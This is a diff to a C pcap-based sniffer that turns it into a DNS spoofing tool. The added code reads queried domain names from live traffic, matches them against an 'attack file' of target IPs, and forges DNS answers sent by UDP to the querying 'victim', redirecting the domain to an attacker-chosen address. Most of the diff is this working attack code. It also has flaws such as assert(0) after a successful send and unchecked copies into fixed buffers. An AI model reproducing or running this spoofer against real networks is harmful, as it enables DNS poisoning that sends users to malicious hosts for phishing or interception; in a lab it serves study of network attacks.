@@ -3,9 +3,12 @@
 #include <getopt.h>
 #include <stdint.h>
 #include <string.h>
+#include <unistd.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
 #include <netinet/if_ether.h>
+#include <assert.h>
+#include <errno.h>
 
 int	packet_count = 0;
 
@@ -34,14 +37,14 @@ typedef struct ip_header{
 }ip_header;
 
 /* UDP header*/
-typedef struct udp_header{
-    u_short sport;          // Source port
-    u_short dport;          // Destination port
-    u_short len;            // Datagram length
-    u_short crc;            // Checksum
+typedef struct __attribute__((packed, aligned(1))) udp_header{
+    	uint16_t	sport;          // Source port
+    	uint16_t	dport;          // Destination port
+    	uint16_t	len;            // Datagram length
+    	uint16_t	crc;            // Checksum
 }udp_header;
 
-typedef struct dns_header {
+typedef struct __attribute__((packed, aligned(1))) dns_header {
 	uint16_t	id;
 	uint16_t        flags;
 	uint16_t        questions;
@@ -50,10 +53,19 @@ typedef struct dns_header {
 	uint16_t        arcount;
 } dns_header;
 
-typedef struct dns_question {
+typedef struct __attribute__((packed, aligned(1))) dns_question {
 	uint16_t	qtype;
 	uint16_t	qclass;
 } dns_question;
+
+typedef struct __attribute__((packed, aligned(1))) dns_response {
+	uint16_t	name;
+	uint16_t	type;
+	uint16_t	class;
+	uint32_t	ttl;
+	uint16_t	len;
+	uint32_t	ip;
+} dns_response;
 
 void
 print_payload( u_char	*ptr,
@@ -81,20 +93,135 @@ print_payload( u_char	*ptr,
 
 }
 
+int
+send_spoofed_dns_response(u_char	*dns_req,
+			  char		*target_ip,
+			  int		len,
+			  uint32_t	*dest_ip,
+			  uint16_t	dest_port) {
+
+	u_char			dns_res[1000], packet[1008];
+	dns_response		*spoofed_response = NULL;
+	dns_header		*head = NULL;
+	udp_header		*udp = NULL;
+	int			soc = 0, status = -1;
+	struct sockaddr_in 	victim_addr;
+	char			temp[INET_ADDRSTRLEN];
+
+
+	memset(dns_res, 0, sizeof(dns_res));
+	memcpy(dns_res, dns_req, len);
+
+	head = (struct dns_header *)dns_res;
+	head->answer = htons(0x1);
+	head->flags = htons(0x8180);
+
+	spoofed_response = (struct dns_response *)(dns_res + len);
+	spoofed_response->name = htons(0xc00c);
+	spoofed_response->type = htons(0x1);
+	spoofed_response->class = htons(0x1);
+	spoofed_response->ttl = htonl(600);
+	spoofed_response->len = htons(4);
+	inet_pton(AF_INET, target_ip, &(spoofed_response->ip));
+
+	printf("\nOriginal message:\n");
+	print_payload(dns_req, len);
+	printf("\nSpoofed response:\n");
+	print_payload(dns_res, len + sizeof(dns_response));
+
+	soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (soc < 0) {
+		printf("\nUnable to create UDP raw socket = %d\n", soc);
+		return -1;
+	}
+
+	udp = (struct udp_header *)packet;
+	udp->sport = htons(53);
+	udp->dport = dest_port;
+	udp->len = htons(len + sizeof(dns_response) + 8);
+	udp->crc = 0;
+	memcpy(packet + 8, dns_res, len + sizeof(dns_response));
+
+        printf("\nTotal packet:\n");
+        print_payload(packet, len + sizeof(dns_response) + 8);
+
+	bzero((char *) &victim_addr, sizeof(victim_addr));
+    	victim_addr.sin_family = AF_INET;
+    	victim_addr.sin_port = dest_port;
+	victim_addr.sin_addr.s_addr = *dest_ip;
+
+	inet_ntop(AF_INET, &(victim_addr.sin_addr), temp, INET_ADDRSTRLEN);
+	printf("\nVictim IP address = %s\t", temp);
+	printf("Port = %d\n", ntohs(victim_addr.sin_port));
+
+	status = sendto(soc, packet, len + sizeof(dns_response) + 8, 0, 
+			(struct sockaddr *)&victim_addr, sizeof(victim_addr));
+	if (status < 0) {
+		printf("\nUnable to send packet to victim %d !\n", errno);
+		assert(0);
+	}
+
+	printf("\nSent spoofed response successfully !\n");
+	close(soc);
+	assert(0);
+	return 0;
+
+}
+
+int
+check_attack_target(char	*domain_name,
+		    char	*attack_filename,
+		    char	*target_ip) {
+
+	FILE		*file;
+	char		entry[101];
+	char		*ptr = NULL;
+	int		i = 0;
+	int		ret = 0, status = -1;
+
+	file = fopen(attack_filename, "r");
+	if (file == NULL) {
+		printf("\nattack file not present, please provide complete path for attack file\n");
+		return -1; 
+	}
+
+	while(1) {	
+        	ptr = fgets(entry, 101, file);
+        	if (ptr == NULL)
+			break;
+
+		i = 0;
+		while(!isspace(entry[i])) {
+			target_ip[i] = entry[i];
+			i++;
+		}
+		target_ip[i] = '\0';
+		
+		while(isspace(entry[i]))
+			i++;
+
+		status = strncmp(entry + i, domain_name, strlen(domain_name));
+		if (status == 0) {
+			return 1;
+		}
+	}
+	return ret;	
+}
+
 void
-process_packet(	u_char 				*user,
+process_packet(	u_char 				*attack_filename,
 		const struct pcap_pkthdr 	*header,
 		const u_char 			*p) {
 	u_char			*packet = (u_char *)p;
 	struct ether_header 	*arp_hdr = (struct ether_header *)p;
-	int			i = 0, j = 0;
+	int			i = 0, j = 0, status = -1;
 	int			ip_header_len = 0;
-	ip_address		*ip = NULL;
 	ip_header		*p_hdr = NULL;
 	udp_header		*udp = NULL;
 	dns_header		*dns = NULL;
-	char			*domain_name = NULL;
+	u_char			domain_name[101], *ptr = NULL;
 	dns_question		*quest = NULL;
+	char			target_ip[101];
 
 	if (ntohs(arp_hdr->ether_type) != ETHERTYPE_IP) {
 		return;
@@ -133,14 +260,37 @@ process_packet(	u_char 				*user,
 	printf("\nDNS flags = %d\n", ntohs(dns->flags));
 	printf("\nNumber of DNS questions = %d\n", ntohs(dns->questions));
 
-	domain_name = (char *)(packet + 14 + ip_header_len + 8 + 12);
-	for (i = 0; i < ntohs(dns->questions); i++) {
-		printf("\nQuestion domain length = %s\n", ++domain_name);
-		domain_name = domain_name + strlen(domain_name) + 1;
-		quest = (struct dns_question *)domain_name;
-		printf("\nQuestion qtype = %d\n", ntohs(quest->qtype));
-		printf("\nQuestion qclass = %d\n", ntohs(quest->qclass));
-		domain_name = domain_name + sizeof(dns_question);
+	ptr = (u_char *)(packet + 14 + ip_header_len + 8 + 12);
+	for (i = 0, j = 0; i < ntohs(dns->questions); i++) {
+		while(*ptr) {
+			strncpy(domain_name + j, ptr + 1, *ptr);
+			j = j + *ptr;
+			domain_name[j++] = '.';
+			ptr = ptr + *ptr + 1;
+		}
+		domain_name[j - 1] = '\0';
+		ptr = ptr + 1;
+		printf("\nDomain name = %s\n", domain_name);
+                quest = (struct dns_question *)ptr;
+                printf("\nQuestion qtype = %d\n", ntohs(quest->qtype));
+                printf("\nQuestion qclass = %d\n", ntohs(quest->qclass));
+		ptr = ptr + 4;
+
+		status = 0;
+		status = check_attack_target(domain_name, attack_filename, target_ip);
+		if (status == 0)
+			continue;
+
+		printf("\ntarget IP = %s\n", target_ip);
+
+		status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
+						   target_ip, 
+						   header->len - (14 + ip_header_len + 8),
+						   (uint32_t *)(packet + 14 + 12),
+						   udp->sport);
+		if (status != 0) {
+			printf("\nUnable to send spoofed DNS response to target !\n");
+		}
 	}
 	printf("\n=======================================================================\n");
 }
@@ -148,7 +298,7 @@ process_packet(	u_char 				*user,
 void
 sniff_packet(char        *interface,
              char  	 *filter_string,
-   	     char	 *payload_string) {
+   	     char	 *attack_filename) {
 	char 			errbuf[PCAP_ERRBUF_SIZE];
 	int			result = 0;
 	bpf_u_int32 		mask;		
@@ -182,7 +332,7 @@ sniff_packet(char        *interface,
 		}
 	}
 
-	result = pcap_loop(live_device, 0, process_packet, payload_string);
+	result = pcap_loop(live_device, 0, process_packet, attack_filename);
 	if (result < 0) {
 		printf("\nEn-expected error occurred in live packet capture !!!\n");
 	}		
@@ -193,7 +343,6 @@ int main(int argc, char **argv) {
 	int	count = 0;
 	char	*interface = NULL;
 	char	*attack_filename = NULL;
-	char	*payload_string = NULL;
 	char	bpf_filter[50] = {0};
 	int	index = -1;	
 
@@ -205,7 +354,11 @@ int main(int argc, char **argv) {
 			break;
 			case 'f':
 				attack_filename = optarg;
-				printf("\nReading from pcap file: %s\n", attack_filename);
+				printf("\nReading from attack file: %s\n", attack_filename);
+				if( access(attack_filename, F_OK) == -1 ) {
+					printf("\nAttack file %s not present !\n", attack_filename);
+					return 0;
+				}
 			break;
 			case '?':
 				printf("\nUn-supported option passed !!!\n");
@@ -238,7 +391,7 @@ int main(int argc, char **argv) {
         	printf("\nSniffing on default device: %s\n", interface);
 	}
 
-	sniff_packet(interface, bpf_filter, payload_string);
+	sniff_packet(interface, bpf_filter, attack_filename);
 
 	return 0;
 }
